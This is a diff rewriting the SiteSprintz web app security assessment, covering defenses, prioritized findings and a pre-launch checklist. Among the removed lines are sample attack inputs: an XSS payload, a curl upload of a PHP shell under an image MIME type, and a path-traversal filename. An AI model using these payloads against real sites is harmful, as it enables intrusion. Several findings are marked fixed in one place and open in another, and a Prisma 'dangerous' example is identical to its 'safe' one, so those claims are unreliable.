@@ -1,2014 +1,288 @@
-# 🔒 SiteSprintz Security Assessment
+# SiteSprintz Security Assessment
 
-**Based on**: Web Application Security principles & OWASP Top 10  
-**Date**: November 17, 2025  
-**Status**: Comprehensive analysis complete
+**Date**: August 15, 2026
+**Scope**: Working tree on branch `production-readiness/audit-remediation` (12 committed security commits plus uncommitted/untracked improvements). This assessment reads code on disk, not git HEAD.
+**Method**: Direct review of live middleware, routes, config, and utilities against OWASP Top 10 and production-readiness criteria.
 
 ---
 
 ## Executive Summary
 
-SiteSprintz is a **visual website builder SaaS platform** that allows users to:
-- Create and manage business websites
-- Process payments via Stripe
-- Upload and manage files
-- Use OAuth authentication (Google)
-- Generate and serve static HTML sites
+Since the November 2025 assessment, the working tree has materially improved its security posture: boot-time environment validation, explicit secret loading, environment-scoped CORS, CSRF debug removal, token redaction, local-only test routes, AES-256-GCM encryption for processor credentials, path-contained site isolation, multi-processor webhook signature verification with idempotency, and clickwrap legal acceptance with an audit trail.
 
-This assessment evaluates SiteSprintz through the lens of **Reconnaissance Prevention**, **Attack Surface Analysis**, and **Defense Implementation**.
+The remaining gaps are concentrated in three areas: (1) a few legacy fallbacks that contradict the new secret-loading discipline, (2) JWT transport still relying on client-side storage rather than httpOnly cookies, and (3) operational hardening (Redis-backed rate limit/session stores, magic-byte upload validation, OAuth state nonce). None of the open gaps are unknown to the team; they are documented here with file:line citations so they can be triaged.
+
+This document supersedes the November 17, 2025 assessment. Findings here reflect the code as it runs today.
 
 ---
 
-## 1. 🔍 RECONNAISSANCE - What Information Are We Exposing?
+## 1. Defenses Present in the Working Tree
 
-Reconnaissance is the first step in any attack. Let's evaluate what attackers can learn about SiteSprintz **without** actually hacking.
+### 1.1 Boot-time environment validation
 
-### 1.1 Technology Stack Exposure
+`server/config/validateEnv.js` runs at startup (`server.js:65`) and, in production, blocks startup (`process.exit(1)`) when any of these are missing or set to known dev defaults:
 
-**Current Status**: HIGH EXPOSURE ⚠️
+- `JWT_SECRET` missing or equal to `dev-secret-key-change-in-production`
+- `ADMIN_TOKEN` missing or equal to `dev-token`
+- `ENCRYPTION_KEY` missing or shorter than 32 bytes
+- `STRIPE_SECRET_KEY` missing or not a live key (`sk_live_`)
+- `STRIPE_WEBHOOK_SECRET` missing
+- `STRIPE_PRICE_GROWTH` missing
+- `DATABASE_URL` missing
+- `GOOGLE_CALLBACK_URL` missing or still pointing at ngrok
 
-**What Attackers Can Learn:**
+Warnings (non-blocking) are emitted for `STRIPE_PRICE_STARTER`, `SERVER_IP`, `RESEND_API_KEY`, `RESEND_FROM_EMAIL`. `logBootSummary()` prints presence/absence of secrets and Stripe mode (LIVE/TEST) without printing secret values.
 
-```bash
-# HTTP Headers reveal technology stack
-curl -I https://sitesprintz.com
+### 1.2 Explicit secret loading
 
-# Likely reveals:
-X-Powered-By: Express
-Server: nginx/1.x.x or similar
-Set-Cookie: connect.sid=...  # Express-session signature
-```
+`server/config/secrets.js` provides `getRequiredSecret(name, { allowTestFallback })`. It throws if a secret is missing. The test-only fallback (`test-only-<name>-secret`) is permitted only when `NODE_ENV === 'test'`. This is consumed by `server/middleware/auth.js:7`, `server/services/tokenService.js:17`, `server.js:194` (express-session secret) and `server.js:341` (admin token endpoint).
 
-**Attack Value:**
-- ✅ Identifies Express.js backend → known vulnerabilities
-- ✅ Identifies frontend framework (React) → client-side attack vectors
-- ✅ Session management approach → session fixation opportunities
+### 1.3 CORS by environment
 
-**Findings from Codebase:**
+`server/config/cors.js` builds the CORS options. In production it throws if `CORS_ORIGINS` is empty. Same-origin requests (no `Origin` header) are always allowed. In non-production, localhost/127.0.0.1/`[::1]`/`.local`/`ngrok` origins are allowed. `credentials: true`; allowed headers include `X-CSRF-Token` and `X-Draft-Access-Token`. Mounted at `server.js:134`.
 
-```7:10:server.js
-import helmet from 'helmet';
-// ... but X-Powered-By may still be exposed
-```
+### 1.4 Helmet / CSP
 
-**Issue**: `helmet()` should hide `X-Powered-By` but verify in production.
+`server.js:88` configures Helmet with a CSP allowlist (`'self'`, Stripe, Cloudflare Turnstile, Google Fonts), `object-src 'none'`, `frameguard: deny`, HSTS 1-year with preload, `noSniff`, `xssFilter`, `referrer-policy: strict-origin-when-cross-origin`. `scriptSrc` and `styleSrc` include `'unsafe-inline'` (required for the React/Vite SPA); this is an accepted tradeoff, not a regression.
+
+### 1.5 CSRF protection
+
+`server/middleware/csrf.js` enforces a double-submit token: `GET /api/csrf-token` issues a 32-byte hex token stored against a `sessionId` cookie (httpOnly, secure in prod, sameSite=lax, 24h). State-changing methods require `X-CSRF-Token` matched with `crypto.timingSafeEqual`. The previous auth-endpoint bypass is commented out (`csrf.js:141-144`). Webhooks (signature-verified) and public checkout endpoints are intentionally exempt. Requests carrying an `Authorization` header are exempt because the browser does not auto-attach that header cross-site. A test bypass header (`x-test-bypass-csrf`) is honored only outside production. Debug logging is gated behind `CSRF_DEBUG=true`.
+
+### 1.6 Authentication and tokens
+
+- Passwords hashed with bcrypt (cost 10) at `server/routes/auth.routes.js:89,232,697,751`.
+- Password strength enforced via `ValidationService.validatePasswordStrength` (12+ chars with complexity) at register, reset, and temp-password change.
+- Access tokens are short-lived JWTs (15 minutes, `server/services/tokenService.js:19`).
+- Refresh tokens are 64-char random hex strings stored in the `refresh_tokens` table with `revoked`/`revoked_at`/`expires_at`/`last_used_at` columns, enabling real revocation (`tokenService.js:139-172`).
+- Logout revokes the specific refresh token or all of the user's tokens (`auth.routes.js:593-606`).
+- `requireAuth`/`requireAdmin` (`server/middleware/auth.js`) re-load the user from the database on every request and reject suspended/banned accounts.
+- Tokens are redacted in error logs via `server/utils/redaction.js` (`redactValue`, `redactObject`).
+
+### 1.7 Rate limiting
+
+`server/middleware/rateLimiting.js` defines limiters, all using `standardHeaders: true`, `legacyHeaders: false`:
+
+| Limiter | Limit | Key |
+|---|---|---|
+| `registrationLimiter` | 3 / 15 min | IP |
+| `loginLimiter` | 5 / 15 min (prod) | IP, skipSuccessful |
+| `passwordResetLimiter` | 3 / hour | email |
+| `apiLimiter` | 100 / 15 min | IP |
+| `uploadLimiter` | 20 / hour | IP |
+| `checkoutLimiter` | 10 / min | IP |
+| `orderLimiter` | 100 / hour | IP |
+
+Applied at `server.js:180` for `/api/` (webhooks excluded; they have signature protection).
+
+### 1.8 Test routes local-only
+
+`server/routes/test.routes.js` mounts only when `NODE_ENV` is `test` or `development` (`test.routes.js:31-45`). In `development` it further restricts to loopback IPs unless `DEV_TEST_ROUTE_TOKEN` is set. The router is mounted at `server.js:354`.
+
+### 1.9 Encryption at rest for processor credentials
+
+`server/utils/encryption.js` implements AES-256-GCM with a 12-byte random IV and 16-byte auth tag per ciphertext, base64 output. Key length is enforced (32 bytes). Decryption throws on auth-tag mismatch (tamper detection).
+
+### 1.10 Site isolation and path containment
+
+`server/utils/siteIsolation.js` provides `resolveContainedPath()` (rejects `..`, absolute, NUL bytes), `isSafeSiteIdentifier()` (subdomain regex), `validateDraftId`/`validateSubdomain`/`validateTemplateId` wrappers, and moves draft JSON to `storage/drafts/` (outside `public/`). `server.js:140-150` blocks GET/HEAD on `/drafts` and `/users` from the public tree. SSR route (`server.js:593`) calls `isSafeSiteIdentifier()` before lookup.
+
+### 1.11 Webhook signature verification and idempotency
+
+`server/webhooks/multi-processor-handler.js` verifies signatures for Stripe (`stripe-signature`), Square (`x-square-hmacsha256-signature`), and PayPal (transmission headers + PayPal verify API), then checks the `webhook_events` table for duplicate `event_id`+`processor` before processing. Error messages are sanitized (emails and payment IDs redacted). Webhooks are mounted before `bodyParser.json` so Stripe receives the raw body (`server.js:173`).
+
+### 1.12 Legal acceptance (clickwrap) and audit trail
+
+`server/config/policies.js` exports `POLICY_VERSION = '2026-06-07'` and `THIRD_PARTY_PROCESSORS`. Registration requires `acceptedTerms === true` (`auth.routes.js:70-76`) and logs an audit event with userId, email, policy version, IP, and user agent (`auth.routes.js:152-160`). `server/routes/legal.routes.js` renders Terms, Privacy, Cookies, Refunds, and Third-Party Services pages; processor rows are HTML-escaped via `escapeHtml()` and rendered from the shared config so the public disclosure matches the providers in use.
+
+### 1.13 Stack-trace leakage
+
+`server/middleware/errorHandler.js` includes `err.stack` only when `NODE_ENV === 'development'` and `EXPOSE_ERROR_DETAILS === 'true'`. Production responses return only `{ success, error: message }`. `server/middleware/notFoundHandler.js` returns JSON for `/api/` and a static HTML 404 otherwise (no framework banner leakage).
+
+### 1.14 Turnstile bot protection
+
+`server/utils/captcha.js` verifies Cloudflare Turnstile tokens against the siteverify endpoint. Applied at registration (`auth.routes.js:46-53`) when `TURNSTILE_SECRET_KEY` is set. Skipped in test env.
+
+### 1.15 Secrets hygiene in repo
+
+`.gitignore` ignores `.env`, `.env.*.local`, `csrf_debug.log`, `server.log`, `logs/`, `storage/drafts/`, `public/drafts/*.json`, `public/sites/*/`, `tests/e2e/.auth/`, and `.hermes/`. `.env.example` documents all required variables with generation hints (`openssl rand -hex 32`).
+
+## 2. Findings
+
+Priority definitions: P0 = production blocker / active exploit risk. P1 = serious, fix before launch. P2 = hardening, fix soon. P3 = minor.
+
+### P0
+
+None. The previous P0 items (CSRF auth bypass, missing security headers, no env validation) are resolved in the working tree.
+
+### P1
+
+**P1-1. Admin token value printed to stdout on boot — fixed 15 Aug 2026**
+`server.js` now logs only presence (`Admin token: set|missing`). Do not print the secret.
+
+**P1-2. Legacy JWT secret fallback in `auth-google.js` — fixed 15 Aug 2026**
+`auth-google.js` signs with `getRequiredSecret('JWT_SECRET', { allowTestFallback: true })`, matching `auth.routes.js`.
+
+**P1-3. OAuth `state` is not a CSRF nonce**
+`auth-google.js:136-148` — the `state` parameter passed to Google is the selected plan (e.g. `starter` or `free`) optionally followed by `,intent:publish`. It is predictable business data, not an opaque random token, so it does not protect the OAuth flow against login-CSRF / authorization-code interception replay. Fix: prepend a random `crypto.randomBytes(16).toString('hex')` to state, persist it (Redis or session), and verify it on callback before consuming plan/intent.
+
+**P1-4. CORS env var name mismatch — fixed 15 Aug 2026**
+`buildCorsOptions()` and payment origin checks now read `CORS_ORIGINS` and fall back to `ALLOWED_ORIGINS`. `.env.example` documents both.
+
+**P1-5. Upload DELETE path traversal — fixed 15 Aug 2026**
+`DELETE /api/uploads/:filename` validates the filename and resolves it with `resolveContainedPath()`.
+
+**P1-6. JWT transport still client-side (XSS-exposed)**
+Access and refresh tokens are returned in the JSON response body (`auth.routes.js:195-207, 256-268`) and stored client-side (the legacy `AuthContext` used `localStorage`). Short-lived access tokens reduce blast radius and DB-backed refresh revocation is a real improvement, but a successful XSS still exfiltrates the access token for its 15-minute life and the refresh token for up to 7 days. The November 2025 doc flagged this as P0-3; it remains open. Fix: issue access and refresh tokens as httpOnly, secure, sameSite=strict cookies and stop returning them in the response body; keep `Authorization` header support only for non-browser API clients.
+
+### P2
+
+**P2-1. In-memory rate-limit and CSRF stores**
+`rateLimiting.js` and `csrf.js` use the default in-memory stores. Under multi-instance deployment (Railway replicas, containers) each instance tracks its own counters, so an attacker can multiply their budget by instance count and CSRF tokens do not survive a request landing on a different instance. Fix: add `rate-limit-redis` and a Redis-backed CSRF store (the code already references Redis for OAuth state in `.env.example`).
+
+**P2-2. In-memory express-session store**
+`server.js:193-198` configures `express-session` with no store (default `MemoryStore`). Sessions are lost on restart and not shared across instances. Used only for Passport OAuth flow. Fix: set `store` to a Redis-backed store and add explicit `cookie.sameSite`, `cookie.maxAge`.
+
+**P2-3. Webhook idempotency fails open**
+`server/webhooks/multi-processor-handler.js:51-55` — `checkIdempotency()` returns `false` (not a duplicate) when the DB lookup throws, to "avoid blocking valid events." During a DB outage this allows replayed events to be processed. Fix: on lookup failure, return a 503/500 so the processor retries, rather than risking duplicate side effects.
+
+**P2-4. File upload lacks magic-byte validation and EXIF stripping**
+`server/routes/uploads.routes.js:30-44` validates extension and MIME type only. A crafted file with an image extension and image MIME type can still carry a non-image payload or EXIF metadata (GPS, camera owner). Fix: validate with `file-type` magic bytes and strip EXIF with `sharp` (already a dependency) before persisting.
+
+**P2-5. Test routes in `server.js` bypass the local-IP guard**
+`server.js:357-400` defines inline `/api/test/upgrade-user` and `/api/test/create-draft-site` under the same `NODE_ENV === 'test' || 'development'` guard as `testRoutes`, but without the `isLocalRequest()` check that `test.routes.js` applies. In a development deployment reachable from a LAN, these endpoints mutate user plans and create draft sites for any caller. Fix: route these through `testRoutes` (which already has the guard) or add the `isLocalRequest` check inline.
+
+**P2-6. Admin token exposed via API**
+`server.js:340-343` — `GET /api/admin-token` (behind `requireAdmin`) returns the raw `ADMIN_TOKEN` value in the response body. Even admin-only, returning a long-lived shared secret in an API response increases exposure (proxy logs, browser devtools, accidental frontend logging). Fix: remove the endpoint or return a short-lived derived session token instead.
+
+**P2-7. User enumeration on registration**
+`auth.routes.js:84-86` returns `409 USER_EXISTS` when an email is already registered, confirming account existence. Login, forgot-password, resend-verification, and magic-link correctly return generic messages. Fix: return a generic "check your email to complete registration" for existing emails and send an "account already exists" email instead.
+
+**P2-8. Legal page dates inconsistent with policy version**
+`server/routes/legal.routes.js` — Terms (`:89`), Privacy (`:296`), Cookies (`:486`), Refunds (`:629`) hardcode "Last Updated: November 14, 2025", while the Third-Party Services page (`:853-854`) correctly uses `POLICY_LAST_UPDATED` (June 7, 2026). The clickwrap audit trail stamps `POLICY_VERSION` at acceptance time, but the displayed dates on four pages are stale and inconsistent. Fix: render all five pages from `POLICY_LAST_UPDATED`.
+
+**P2-9. Cookie policy does not match implementation**
+`legal.routes.js:502-520` lists `connect.sid`, `jwt`, and `csrf_token` cookies. The live implementation uses a `sessionId` cookie for CSRF (`csrf.js:70`) and returns JWTs in the response body (no `jwt` cookie is set). The published cookie policy is therefore inaccurate. Fix: update the cookie table to reflect `sessionId` and document token storage accurately.
+
+**P2-10. CSRF debug log writes synchronously**
+`server/middleware/csrf.js:19-23` defines `logFile = path.resolve('csrf_debug.log')` and `log()` uses `fs.appendFileSync`. When `CSRF_DEBUG=true` this performs a synchronous file write on every state-changing request. Low volume, but blocks the event loop. Fix: use the structured logger or remove the file-based logger now that debug is gated.
+
+### P3
+
+**P3-1. Rate-limit module logs at load time**
+`rateLimiting.js:16` — `console.log(\`[RateLimit] NODE_ENV=...\`)` runs on import. Minor log noise; not sensitive. Fix: remove or gate behind a debug flag.
+
+**P3-2. CSRF token map unbounded in long-running dev**
+`csrf.js:27` — `csrfTokens` Map has a FIFO cap of 10000 (`cleanupExpiredTokens`), but cleanup is not scheduled automatically. In a long-running dev session the map can grow until manual cleanup. Fix: schedule `cleanupExpiredTokens()` on an interval or move to Redis.
+
+**P3-3. `notFoundHandler` returns styled HTML for non-API 404s**
+`notFoundHandler.js:16-74` returns a full HTML 404 page for non-API routes. This is intentional UX, but the inline styles are duplicated rather than served from the design system. Cosmetic only.
+
+## 3. Working-Tree Changes: Real Improvements vs. Open Gaps
+
+### Real improvements (untracked or modified, first-class)
+
+| File | Change | Verdict |
+|---|---|---|
+| `server/config/validateEnv.js` (untracked) | Boot-time prod secret/Stripe-live checks, `process.exit(1)` on blocking errors | Real, effective |
+| `server/config/policies.js` (untracked) | `POLICY_VERSION` clickwrap + processor list | Real, enforceable |
+| `server/middleware/notFoundHandler.js` (untracked) | JSON/HTML 404, no framework banner | Real |
+| `server/utils/encryption.js` (untracked) | AES-256-GCM, random IV, auth tag | Real, correct |
+| `server/utils/siteIsolation.js` (untracked) | Path containment, draft JSON outside `public/` | Real, correct |
+| `server/webhooks/multi-processor-handler.js` (untracked) | Signature verify + idempotency + error sanitize | Real; fails open (P2-3) |
+| `server/config/cors.js` (committed) | Env-scoped allowlist, throws if empty in prod | Real; name mismatch (P1-4) |
+| `server/config/secrets.js` (committed) | `getRequiredSecret`, test-only fallback | Real; `auth-google.js` not migrated (P1-2) |
+| `server/middleware/csrf.js` (modified) | Debug gated behind `CSRF_DEBUG`, auth bypass removed | Real |
+| `server/middleware/errorHandler.js` (modified) | Stack traces only in dev + explicit flag | Real |
+| `server/middleware/rateLimiting.js` (modified) | Per-route limiters with `standardHeaders` | Real; in-memory (P2-1) |
+| `server/routes/legal.routes.js` (modified) | Five legal pages, escapeHtml, policy version | Real; date drift (P2-8) |
+| `server/routes/auth.routes.js` | Clickwrap acceptance, audit log, refresh-token revocation | Real |
+| `.env.example` (modified) | Documents all required vars + generation hints | Real; CORS name mismatch (P1-4) |
+| `.gitignore` (modified) | Ignores logs, drafts, auth state, secrets | Real |
+
+### Still-open gaps (not closed by the working tree)
+
+1. JWT transport: still response-body + client storage, not httpOnly cookies (P1-6).
+2. OAuth `state` not a random nonce (P1-3).
+3. `auth-google.js` JWT secret fallback (P1-2).
+4. Admin token logged on boot (P1-1) and exposed via API (P2-6).
+5. CORS env var name split (P1-4).
+6. Upload DELETE path traversal + no magic-byte/EXIF handling (P1-5, P2-4).
+7. Redis backing missing for rate limit, CSRF, session stores (P2-1, P2-2).
+8. Inline test routes in `server.js` lack local-IP guard (P2-5).
+9. Webhook idempotency fails open on DB error (P2-3).
+10. Legal page date/cookie-policy drift (P2-8, P2-9).
 
 ---
 
-### 1.2 API Endpoint Discovery
+## 4. Contradictions vs. the November 2025 Assessment
 
-**Current Status**: MODERATE EXPOSURE ⚠️
+The November 17, 2025 `SECURITY-ASSESSMENT.md` is now largely obsolete. Specific contradictions:
 
-**Exposed Endpoints** (easily discoverable):
+| 2025 claim | Live code (Aug 2026) | Status |
+|---|---|---|
+| "CSRF bypass on `/api/auth/` is a production blocker" (`csrf.js:107-112`) | Auth bypass commented out (`csrf.js:141-144`); cookie-parser wired (`server.js:177`) | Resolved |
+| "JWT secret weak default `your-secret-key-change-in-production`" (`auth.js:4`) | `secrets.js` throws if missing; `auth.js:7` uses getter | Resolved (except `auth-google.js:12`, P1-2) |
+| "No environment variable validation" (Phase 3, P2-4) | `validateEnv.js` blocks prod boot on missing secrets | Resolved |
+| "No security headers / Helmet" (P0-4) | `server.js:88` Helmet with full CSP, HSTS, frameguard | Resolved |
+| "No rate limiting" (P2) | `rateLimiting.js` with 7 limiters | Resolved (in-memory store remains, P2-1) |
+| "No Stripe webhook idempotency" (2.2.A.1) | `webhook_events` table + `checkIdempotency` | Resolved (fails open, P2-3) |
+| "JWT in localStorage, move to httpOnly cookies" (P0-3) | Tokens still returned in JSON body | Open (P1-6) |
+| "Visual editor XSS, no sanitization" (P0-2) | `ValidationService.sanitizeString` applied via `validate` middleware; CSP restricts script sources | Partially resolved; full DOMPurify-on-store not confirmed in `sites.routes.js` — recommend a follow-up code check |
+| "No ownership/IDOR verification" (P1-2) | Not re-verified in this audit; flagged for the routes agent | Needs follow-up |
 
-```javascript
-// Authentication
-POST /api/auth/register
-POST /api/auth/login
-GET  /api/auth/user
-
-// Sites
-POST /api/sites
-GET  /api/sites/:id
-PUT  /api/sites/:id
-
-// Uploads
-POST /api/uploads
-POST /api/upload
-
-// Webhooks
-POST /api/webhooks/stripe
-
-// Admin
-POST /api/admin/* (requires admin role)
-```
-
-**Attack Value:**
-- ✅ Attackers know exact endpoints to target
-- ✅ Can craft automated attacks
-- ✅ Can test for authorization flaws
-
-**Recommendation**: This is acceptable - security through obscurity doesn't work. Focus on proper authentication/authorization.
+The 2025 doc's "Phase 1-4" implementation plan is no longer the source of truth; use Section 2 findings here.
 
 ---
 
-### 1.3 Error Message Information Leakage
+## 5. Files Not Modified by This Audit
 
-**Current Status**: NEEDS REVIEW ⚠️
+Per scope, this audit did not edit any application code. Only two canonical docs were rewritten:
 
-**Potential Issues:**
+- `docs/security/SECURITY-ASSESSMENT.md` (this file) — rewritten from live code.
+- `docs/security/QUICK-START-SECURITY.md` — rewritten from live code.
 
-```javascript
-// Example from server.js
-catch (err) {
-  console.error('Login error:', err);
-  res.status(500).json({ error: 'Failed to login' });  // Good - generic
-}
-```
-
-**Good Practices Found:**
-- ✅ Generic error messages to users
-- ✅ Detailed errors logged server-side
-
-**Risk Areas to Check:**
-- ❌ Database errors (may leak schema info)
-- ❌ Validation errors (may reveal business logic)
-- ❌ Stack traces in production
+Untouched (intentionally):
+- `docs/ARCHITECTURE.md`, `docs/plans/BACKLOG.md`, `docs/features/QUICK_REFERENCE_STATUS.md`
+- `docs/security/PASSWORD-REQUIREMENTS-IMPLEMENTATION.md` (kept; live code enforces 12+ char complexity via `ValidationService`, consistent)
+- `docs/security/SESSION-MANAGEMENT-IMPLEMENTATION.md` (kept; live refresh-token revocation in `tokenService.js` is consistent with it, though the httpOnly-cookie recommendation in that doc is not yet implemented — see P1-6)
+- `docs/security/README.md`
+- All `server/**`, `src/**`, `auth-google.js`, `vite.config.js`, `.env.example`, `.gitignore`
 
 ---
 
-### 1.4 Subdomain and DNS Enumeration
+## 6. Vite `/legal` Proxy Check
 
-**Current Status**: MEDIUM RISK ⚠️
+`vite.config.js` proxies `/api`, `/auth`, `/uploads`, and `/data` to the backend. It does **not** proxy `/legal`. In local development (Vite on port 5173), a Register-page link to `/legal/terms` is served by Vite's static middleware as the SPA `index.html`, not by Express's `legal.routes.js`. The server-rendered legal pages are only reachable in dev by hitting port 3000 directly. In production (single Express server on 3000 serving the built SPA from `dist/`), `/legal/*` is handled by Express before the SPA fallback (`server.js:337`), so legal pages render correctly.
 
-**Issue**: Multi-tenant architecture with predictable subdomains
-
-```javascript
-// Sites are served at predictable URLs
-https://sitesprintz.com/sites/{subdomain}/
-```
-
-**Attack Value:**
-- ✅ Enumerate all customer sites
-- ✅ Identify popular/high-value targets
-- ✅ Test for subdomain takeover
-
-**Recommendation**: Acceptable for current architecture, but consider:
-- Rate limiting on site creation
-- CAPTCHA for public site discovery
-- Monitoring for enumeration attempts
+Impact: dev-only UX gap (legal links from Register show the SPA shell instead of the legal HTML in dev). Not a security vulnerability. Fix (optional): add `/legal` to the Vite proxy so dev matches prod.
 
 ---
 
-### 1.5 Dependency Discovery
+## 7. Pre-Launch Checklist (Current State)
 
-**Current Status**: MODERATE EXPOSURE ⚠️
-
-**From `package.json`:**
-
-```json
-{
-  "dependencies": {
-    "express": "^5.1.0",
-    "stripe": "^19.1.0",
-    "pg": "^8.16.3",
-    "react": "^19.2.0",
-    // ... 20+ more
-  }
-}
-```
-
-**If `package.json` or `package-lock.json` are exposed:**
-- ✅ Attackers know EXACT versions
-- ✅ Can find known CVEs
-- ✅ Can craft version-specific exploits
-
-**Current Protection:**
-- ✅ These files are NOT served publicly (in `.gitignore` for web root)
-
-**Issue**: Still visible on GitHub (public repo?)
+| Item | Status | Evidence |
+|---|---|---|
+| CSRF on all state-changing endpoints (no bypass) | Done | `csrf.js`, auth bypass removed |
+| Security headers (Helmet + CSP) | Done | `server.js:88` |
+| Env validation at boot | Done | `validateEnv.js` |
+| Explicit secret loading (no fallbacks) | Mostly | `secrets.js`; `auth-google.js:12` still falls back (P1-2) |
+| Rate limiting on auth/API/upload | Done | `rateLimiting.js` |
+| HTTPS enforced in prod (HSTS) | Done | Helmet hsts preload |
+| Webhook signature verification + idempotency | Done | `multi-processor-handler.js` |
+| Stack traces hidden in prod | Done | `errorHandler.js` |
+| Token redaction in logs | Done | `redaction.js` |
+| Clickwrap legal acceptance + audit | Done | `policies.js`, `auth.routes.js:152` |
+| Encryption at rest for processor creds | Done | `encryption.js` |
+| Path containment for drafts/sites | Done | `siteIsolation.js` |
+| JWT in httpOnly cookies | Open | P1-6 |
+| OAuth state nonce | Open | P1-3 |
+| Redis-backed rate/session/CSRF stores | Open | P2-1, P2-2 |
+| Magic-byte upload validation | Open | P2-4 |
+| Admin token not logged / not exposed | Open | P1-1, P2-6 |
+| CORS env name consistent | Open | P1-4 |
 
 ---
 
-### 1.6 Source Code Exposure
-
-**Current Status**: CRITICAL IF PUBLIC ⚠️
-
-**If GitHub repository is public:**
-- ✅ Complete attack blueprint available
-- ✅ Business logic revealed
-- ✅ Historical vulnerabilities in git history
-- ✅ API structure and validation rules exposed
-
-**Recommendation**:
-- Keep production repos PRIVATE
-- Separate public demo/docs repo from production code
-- Never commit secrets (even if later removed)
-
----
-
-## 2. 🎯 ATTACK SURFACE ANALYSIS
-
-Let's map every entry point where attackers can interact with SiteSprintz.
-
-### 2.1 User Input Entry Points
-
-#### A. Authentication Forms
-
-```javascript
-POST /api/auth/register
-  - email (validated ✅)
-  - password (validated ✅)
-
-POST /api/auth/login
-  - email (validated ✅)
-  - password (validated ✅)
-```
-
-**Current Protection:**
-
-```175:225:server/services/validationService.js
-  sanitizeString(str, options = {}) {
-    if (str === null || str === undefined) return '';
-    if (typeof str !== 'string') str = String(str);
-
-    // Remove zero-width characters if requested
-    if (options.removeInvisible) {
-      str = str.replace(this.patterns.zeroWidth, '');
-    }
-
-    // Decode HTML entities first if requested (to catch encoded XSS)
-    if (options.decodeFirst) {
-      str = validator.unescape(str);
-    }
-
-    // Normalize Unicode
-    if (options.normalize) {
-      str = str.normalize('NFC');
-    }
-
-    // Trim whitespace by default
-    str = str.trim();
-
-    // Remove or escape HTML tags
-    if (options.escape) {
-      str = validator.escape(str);
-    } else {
-      // Strip HTML tags while preserving text content
-      // Using a simple regex approach to keep ALL text content
-      str = str.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, (match) => {
-        // Extract text content from script tags
-        return match.replace(/<\/?script[^>]*>/gi, '');
-      });
-      
-      // Remove all other HTML tags but keep their content
-      str = str.replace(/<[^>]+>/g, '');
-      
-      // Clean up any remaining dangerous patterns
-      str = str.replace(/on\w+\s*=/gi, '');
-      str = str.replace(/javascript:/gi, '');
-    }
-
-    // Remove shell command injection characters
-    str = str.replace(/[;&|`$()]/g, '');
-
-    // Enforce max length
-    if (options.maxLength && str.length > options.maxLength) {
-      str = str.substring(0, options.maxLength);
-    }
-
-    return str;
-  }
-```
-
-**Strengths:**
-- ✅ Comprehensive sanitization
-- ✅ XSS prevention
-- ✅ Shell injection prevention
-- ✅ Length limits
-
-**Concerns:**
-- ⚠️ May be overly aggressive (removes legitimate special chars)
-- ⚠️ Unicode normalization may have edge cases
-
----
-
-#### B. Visual Editor (Site Builder)
-
-**CRITICAL ATTACK SURFACE** 🚨
-
-```javascript
-POST /api/sites
-PUT  /api/sites/:id
-  - siteData (JSON object containing HTML/CSS/JS)
-```
-
-**Issue**: Users can inject **arbitrary HTML** into generated sites.
-
-**Current Protection**: INSUFFICIENT ⚠️
-
-The `ValidationService` sanitizes strings, but the visual editor generates complete HTML documents:
-
-```javascript
-// User can create site with:
-{
-  "sections": [
-    {
-      "content": "<img src=x onerror=alert('XSS')>"
-    }
-  ]
-}
-```
-
-**Vulnerability Types:**
-1. **Stored XSS**: Malicious JS stored in database
-2. **Self-XSS**: User attacks themselves (low priority)
-3. **Reflected XSS**: Via preview/sharing
-4. **DOM-based XSS**: Client-side JS injection
-
-**Risk**: HIGH 🔴
-- Affects ALL visitors to generated sites
-- Can steal cookies, session tokens
-- Can redirect to phishing sites
-- Can inject crypto miners
-
-**Recommendation**: See Section 3.1 for detailed mitigation.
-
----
-
-#### C. File Uploads
-
-**Current Implementation:**
-
-```30:44:server/routes/uploads.routes.js
-const upload = multer({ 
-  storage: storage,
-  limits: { fileSize: 10 * 1024 * 1024 }, // 10MB limit
-  fileFilter: (req, file, cb) => {
-    const allowedTypes = /jpeg|jpg|png|gif|webp/;
-    const extname = allowedTypes.test(path.extname(file.originalname).toLowerCase());
-    const mimetype = allowedTypes.test(file.mimetype);
-    
-    if (mimetype && extname) {
-      return cb(null, true);
-    } else {
-      cb(new Error('Only image files are allowed'));
-    }
-  }
-});
-```
-
-**Strengths:**
-- ✅ File size limits (10MB)
-- ✅ MIME type validation
-- ✅ Extension whitelist
-- ✅ Unique filename generation
-
-**Vulnerabilities:**
-
-1. **Bypass via Double Extension**:
-   ```
-   malicious.jpg.php  → detected ✅
-   ```
-
-2. **MIME Type Spoofing**:
-   ```bash
-   # Upload PHP shell with image MIME type
-   curl -F "file=@shell.php;type=image/jpeg"
-   ```
-   **Status**: Partially protected by extension check
-
-3. **Image-based Exploits**:
-   - Polyglot files (valid image + malicious payload)
-   - EXIF injection
-   - Image parser vulnerabilities (libpng, etc.)
-
-4. **Path Traversal**:
-   ```javascript
-   // Filename: ../../../../etc/passwd
-   ```
-   **Status**: Protected by `uniqueSuffix` generation ✅
-
-**Recommendations**:
-- ✅ Good baseline protection
-- ⚠️ Add content-based validation (magic bytes)
-- ⚠️ Consider virus scanning for enterprise
-- ⚠️ Strip EXIF data to prevent info leakage
-
----
-
-#### D. Database Queries
-
-**Using Prisma ORM**:
-
-```javascript
-// Prisma uses parameterized queries by default
-await prisma.user.findUnique({
-  where: { id: userId }
-});
-```
-
-**SQL Injection Risk**: LOW ✅
-- Prisma prevents SQL injection via parameterization
-- No raw SQL queries found (good!)
-
-**But watch for**:
-```javascript
-// ❌ DANGEROUS (if it exists):
-await prisma.$executeRaw`SELECT * FROM users WHERE id = ${userId}`
-
-// ✅ SAFE:
-await prisma.$executeRaw`SELECT * FROM users WHERE id = ${userId}`
-// Prisma auto-escapes even in raw queries
-```
-
----
-
-### 2.2 Third-Party Integration Points
-
-#### A. Stripe Payment Processing
-
-**Current Implementation:**
-
-```38:42:server.js
-const STRIPE_SECRET_KEY = process.env.STRIPE_SECRET_KEY || '';
-const STRIPE_PUBLISHABLE_KEY = process.env.STRIPE_PUBLISHABLE_KEY || '';
-const STRIPE_WEBHOOK_SECRET = process.env.STRIPE_WEBHOOK_SECRET || '';
-const stripe = STRIPE_SECRET_KEY ? new Stripe(STRIPE_SECRET_KEY, { apiVersion: '2024-06-20' }) : null;
-```
-
-**Webhook Handling:**
-
-```javascript
-// Signature verification (GOOD!)
-POST /api/webhooks/stripe
-  - Verifies Stripe signature
-  - Validates event authenticity
-```
-
-**Vulnerabilities:**
-
-1. **Replay Attacks**: ⚠️
